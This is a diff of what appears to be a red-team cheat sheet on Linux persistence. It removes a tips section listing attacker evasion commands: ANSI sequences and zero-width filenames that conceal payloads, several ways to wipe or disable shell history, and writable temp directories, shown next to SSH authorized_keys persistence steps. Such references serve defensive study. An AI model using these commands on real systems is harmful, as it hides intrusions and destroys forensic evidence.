@@ -134,53 +134,6 @@ Add an ssh key into the `~/.ssh` folder.
 2. write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys`
 3. set the right permission, 700 for ~/.ssh and 600 for authorized_keys
 
-## Tips
-
-Hide the payload with ANSI chars, the following chars will clear the terminal when using cat to display the content of your payload.
-
-```powershell
-#[2J[2J[2J[2H[2A# Do not remove. Generated from /etc/issue.conf by configure.
-```
-
-Hide in plain sight using zero width spaces in filename.
-
-```powershell
-touch $(echo -n 'index\u200D.php') index.php
-```
-
-Clear the last line of the history.
-
-```bash
-history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null
-```
-
-Clear history
-
-```bash
-[SPACE] ANY COMMAND
-or
-export HISTSIZE=0
-export HISTFILESIZE=0
-unset HISTFILE; CTRL-D
-or
-kill -9 $$
-or
-echo "" > ~/.bash_history
-or
-rm ~/.bash_history -rf
-or
-history -c
-or
-ln /dev/null ~/.bash_history -sf
-```
-
-The following directories are temporary and usually writeable
-
-```bash
-/var/tmp/
-/tmp/
-/dev/shm/
-```
 ## Additional Persistence Options
 
 * [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)
